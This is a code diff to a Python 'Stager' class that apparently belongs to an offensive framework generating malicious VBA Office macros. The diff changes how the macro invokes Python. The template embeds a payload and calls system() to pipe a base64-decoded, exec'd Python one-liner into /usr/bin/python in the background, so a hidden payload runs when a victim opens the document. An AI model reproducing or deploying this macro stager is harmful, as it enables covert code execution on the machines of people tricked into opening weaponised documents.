@@ -125,8 +125,8 @@ class Stager:
                             Dim result As Long
                             Dim cmd As String
                             %s
-                            'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
-                            result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
+                            'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | /usr/bin/python &")
+                            result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | /usr/bin/python &")
                     #End If
         End Function""" %(payload)
             elif version == "new":
@@ -149,8 +149,8 @@ class Stager:
                             Dim result As LongPtr
                             Dim cmd As String
                             %s
-                            'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
-                            result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &", "r")
+                            'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | /usr/bin/python &")
+                            result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | /usr/bin/python &", "r")
                     #End If
         End Function""" % (payload)
             else:
